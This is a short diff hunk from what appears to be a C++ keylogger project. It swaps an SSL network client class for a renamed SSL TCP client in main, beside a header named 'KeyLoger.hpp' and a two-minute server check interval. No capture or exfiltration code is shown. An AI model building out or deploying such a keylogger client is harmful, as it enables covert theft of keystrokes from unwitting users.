@@ -5,11 +5,11 @@
 
 #include "KeyLoger.hpp"
 #include "Parser.hpp"
-#include "SSLNetwork.hpp"
+#include "SSLTCPClient.hpp"
 
 int main(int argc, char **argv)
 {
-	SSLNetwork client;
+	SSLTCPClient client;
 	Parser	parser(client);
 	const int serverCheckDelay = 2*60;
 	unsigned long timestamp;
